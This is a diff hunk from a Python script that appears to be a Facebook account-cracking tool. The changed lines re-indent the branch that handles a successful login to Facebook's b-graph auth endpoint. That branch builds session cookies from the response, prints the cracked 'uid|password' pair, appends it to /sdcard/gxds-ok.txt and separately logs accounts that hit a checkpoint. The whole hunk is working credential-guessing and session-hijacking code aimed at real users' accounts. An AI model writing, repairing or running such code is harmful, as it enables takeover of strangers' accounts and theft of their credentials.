@@ -327,14 +327,12 @@ def gxds_files(uid,pwx):
                     'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
             q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
             if "session_key" in q:
-              gxdsCKIE = ";".join(i["name"]+"="+i["value"] for i in
-              q["session_cookies"]);gxdsCK =
-              base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie
-              = f"sb={gxdsCK};{gxdsCKIE}"
-                print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
-                open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
-                oks.append(uid)
-                break
+                    gxdsCKIE = ";".join(i["name"]+"="+i["value"] for i in
+                    q["session_cookies"]);gxdsCK = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={gxdsCK};{gxdsCKIE}"
+                    print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
+                    open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
+                    oks.append(uid)
+                    break
             elif "www.facebook.com" in q['error']['message']:
                 print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                 cps.append(uid)
